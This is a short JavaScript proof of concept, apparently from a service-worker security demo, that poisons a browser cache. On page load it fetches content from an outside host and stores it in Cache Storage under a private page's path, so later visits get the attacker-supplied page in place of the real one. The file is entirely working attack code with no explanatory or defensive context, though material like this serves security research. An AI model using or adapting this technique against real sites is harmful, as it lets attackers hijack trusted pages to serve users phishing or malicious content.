const bad_url = 'https://snkth.com/cfh/';
const url_to_overwrite = '/ServiceWorkersPoC/private.html';

window.onload = function () {
  fetch(bad_url).then(function (response) {
    if (!response.ok) {
      throw new TypeError('Bad response status');
    }
    caches.open('v1').then(function (cache) {
      cache.put(url_to_overwrite, response);
    });
  });
};
